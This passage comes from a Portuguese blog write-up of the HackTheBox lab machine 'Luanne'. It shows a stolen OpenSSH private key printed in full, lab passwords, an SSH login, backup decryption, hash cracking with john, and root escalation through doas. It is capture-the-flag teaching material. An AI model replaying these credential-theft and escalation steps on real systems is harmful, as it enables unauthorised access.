+&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
+table <span class="o">{</span>
+border-top: 1px solid black<span class="p">;</span>
+border-bottom: 1px solid black<span class="p">;</span>
+<span class="o">}</span>
+th <span class="o">{</span> background: aquamarine<span class="p">;</span> <span class="o">}</span>
+<span class="nb">tr</span>:nth-child<span class="o">(</span>even<span class="o">)</span> <span class="o">{</span> background: lavender<span class="p">;</span> <span class="o">}</span>
+&lt;/style&gt;
+&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;
+&lt;table <span class="nv">cols</span><span class="o">=</span>3&gt;
+&lt;thead&gt;
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;th&gt;Name&lt;th&gt;Last modified&lt;th <span class="nv">align</span><span class="o">=</span>right&gt;Size
+&lt;tbody&gt;
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;td&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"../"</span><span class="o">&gt;</span>Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td <span class="nv">align</span><span class="o">=</span>right&gt;1kB
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;td&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"id_rsa"</span><span class="o">&gt;</span>id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td <span class="nv">align</span><span class="o">=</span>right&gt;3kB
+&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Ao baixar este arquivo, notamos que se trata de uma chave OpenSSH,  a qual possivelmente nos permitirá logar com a conta <code class="language-plaintext highlighter-rouge">r.michaels</code> e obter a flag do usuário.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:3001/~r.michaels/id_rsa <span class="nt">-u</span> webapi_user
+Enter host password <span class="k">for </span>user <span class="s1">'webapi_user'</span>:iamthebest
+
+% Total % Received % Xferd Average Speed Time Time Time Current
+Dload Upload Total Spent Left Speed
+100 2610 100 2610 0 0 2548k 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 2548k
+<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
+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
+<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>Ao validar a chave RSA existente (<code class="language-plaintext highlighter-rouge">id_rsa</code>) notei que não se trata de uma chave RSA, mas uma chave <code class="language-plaintext highlighter-rouge">OPENSSH</code>. Para convertê-la precisei realizar os seguintes procedimentos:</p>
+
+<ul>
+  <li>Remover a quebra de linha ao final do arquivo, após a instrução <code class="language-plaintext highlighter-rouge">-----END OPENSSH PRIVATE KEY-----</code>.</li>
+  <li>Conversão de OpenSSH para RSA usando o comando abaixo, assim como a redefinição das permissões para que pudéssemos utilizá-la com o <code class="language-plaintext highlighter-rouge">ssh</code>, informando a senha da chave a ser exportada em branco.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 id_rsa
+ssh-keygen <span class="nt">-p</span> <span class="nt">-m</span> PEM <span class="nt">-f</span> ./id_rsa
+Key has comment <span class="s1">'r.michaels@luanne.htb'</span>
+Enter new passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
+Enter same passphrase again:
+Your identification has been saved with the new passphrase.
+</code></pre></div></div>
+
+<p>Com esta chave, o acesso com a conta <code class="language-plaintext highlighter-rouge">r.michaels</code>foi possível, onde obtivemos o flag de usuário.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa r.michaels@10.10.10.218
+The authenticity of host <span class="s1">'10.10.10.218 (10.10.10.218)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.218<span class="s1">' (ECDSA) to the list of known hosts.
+Last login: Sat Feb 20 07:14:11 2021 from 10.10.14.33
+NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+  
+Welcome to NetBSD!
+  
+luanne$ id &amp;&amp; pwd &amp;&amp; ls -la
+uid=1000(r.michaels) gid=100(users) groups=100(users)
+/home/r.michaels
+total 52
+dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 .
+drwxr-xr-x 3 root wheel 512 Sep 14 06:46 ..
+-rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrc
+drwx------ 2 r.michaels users 512 Sep 14 17:16 .gnupg
+-rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login
+-rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout
+-rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile
+-rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrc
+dr-x------ 2 r.michaels users 512 Sep 16 16:51 .ssh
+dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 backups
+dr-xr-x--- 4 r.michaels users 512 Sep 16 15:02 devel
+dr-x------ 2 r.michaels users 512 Sep 16 16:52 public_html
+-r-------- 1 r.michaels users 33 Sep 16 17:16 user.txt
+luanne$ cat user.txt
+&lt;redacted&gt;
+</span></code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>No home directory do usuário <code class="language-plaintext highlighter-rouge">r.michaels</code> encontrada uma pasta chamada backups, que contém um arquivo criptografado <strong>devel_backup-2020-09-16.tar.gz.enc</strong>. Para descriptografá-lo precisamos de uma senha ou chave deste usuário.</p>
+
+<p>Executando o script <code class="language-plaintext highlighter-rouge">linpeas.sh</code> vi alguns insights interessantes que nos ajudariam a encontrar o caminho para o <code class="language-plaintext highlighter-rouge">root</code>:</p>
+
+<ul>
+  <li>Usuário r.michaels possui acessos <strong>doas</strong> de execução como <code class="language-plaintext highlighter-rouge">root</code>, equivalentes ao <code class="language-plaintext highlighter-rouge">sudo</code> em outras distribuições;</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Checking doas.conf
+permit r.michaels as root
+</code></pre></div></div>
+
+<ul>
+  <li>Chave PGP para o app <code class="language-plaintext highlighter-rouge">netpgp</code>, que permite criptografar, descriptografar e assinar arquivos;
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>[+] Do I have PGP keys?
+gpg Not Found
+/usr/bin/netpgpkeys
+1 key found
+"pub" 2048/"RSA (Encrypt or Sign)" "op" 2020-09-14
+Key fingerprint: "027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a "
+uid "RSA 2048-bit key &lt;r.michaels@localhost&gt;" ""
+</code></pre></div>    </div>
+  </li>
+  <li>Caminhos user writable:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/home/r.michaels
+/tmp
+/var/mail
+/var/mail/r.michaels
+/var/shm
+/var/spool/sockets
+</code></pre></div></div>
+
+<p>Uma vez que ja temos as informações acima, segui com a tentativa descriptografar o arquivo de backup utilizando a chave pgp encontrada. O ponto importante neste item é utilizar um caminho user writable, neste caso o <code class="language-plaintext highlighter-rouge">/var/shm</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luanne<span class="nv">$ </span>netpgp <span class="nt">--decrypt</span> <span class="nt">--output</span><span class="o">=</span>/var/shm/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc
+signature 2048/RSA <span class="o">(</span>Encrypt or Sign<span class="o">)</span> 3684eb1e5ded454a 2020-09-14
+Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
+uid RSA 2048-bit key &lt;r.michaels@localhost&gt;
+</code></pre></div></div>
+
+<p>Analisando o conteúdo do arquivo compactado, vimos que temos os arquivos utilizados para a API e index.html, mas o que chamou a atenção foi o conteúdo do <strong>.htpasswd</strong>, que embora tivesse o mesmo user(<em>webapi_user</em>), apresentava uma senha diferente da já encontrada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tree <span class="nt">-a</span> devel-2020-09-16
+devel-2020-09-16
+├── webapi
+│ └── weather.lua
+└── www
+├── .htpasswd
+└── index.html
+</code></pre></div></div>
+
+<p>Utilizando o mesmo método feito para o arquivo anterior, foi encontrada a senha <strong>littlebear</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>md5crypt-long ./www/.htpasswd
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt-long, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+littlebear <span class="o">(</span>webapi_user<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2021-02-20 16:02<span class="o">)</span> 1.333g/s 17216p/s 17216c/s 17216C/s mirame..limewire
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Assim como o <code class="language-plaintext highlighter-rouge">sudo</code>, o <code class="language-plaintext highlighter-rouge">doas</code> requer que uma senha seja informada, onde <strong>littlebear</strong> funcionou como esperado, permitindo a obtenção da flag de root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>doas /bin/sh
+Password:
+<span class="c"># hostname &amp;&amp; id</span>
+luanne.htb
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,2<span class="o">(</span>kmem<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span><span class="nb">tty</span><span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>,20<span class="o">(</span>staff<span class="o">)</span>,31<span class="o">(</span>guest<span class="o">)</span>,34<span class="o">(</span>nvmm<span class="o">)</span>
+<span class="c"># cat /root/root.txt</span>
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>Espero que tenham gostado!</p>
+
+<p>Vejo vocês novamente em breve! <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-easy" class="page__taxonomy-item" rel="tag">htb-easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorias: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Atualizado em:</strong> <time datetime="2021-03-27T09:00:00-03:00">March 27, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Compartilhe</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+Luanne%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F03%2Fhtb-luanne%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F03%2Fhtb-luanne%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F03%2Fhtb-luanne%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F03%2Fhtb-luanne%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F03%2Fhtb-luanne%2F&amp;text=Hackthebox+write-up%3A+Luanne" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/writeup/2021/03/htb-passage/" class="pagination--pager" title="Hackthebox write-up: Passage
+">Anterior</a>
+    
+    
+    
+      
+        <a href="/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder/" class="pagination--pager" title="Azure Sentinel: Configuração do Log Forwarder
+">Próxima</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Deixe um comentário</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Talvez você também goste</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/03/htb-luanne/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/wHnMfBz.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/" rel="permalink">Hackthebox write-up: ScriptKiddie
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/03/htb-luanne/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/03/htb-luanne/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/03/htb-luanne/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Pesquisar...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Acompanhe no</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/termos-e-privacidade" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Termos de uso e Política Privacidade</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+      
+    
+    
+    <li><a href="https://davicruz.com/en-US">Also available in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Desenvolvido com <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
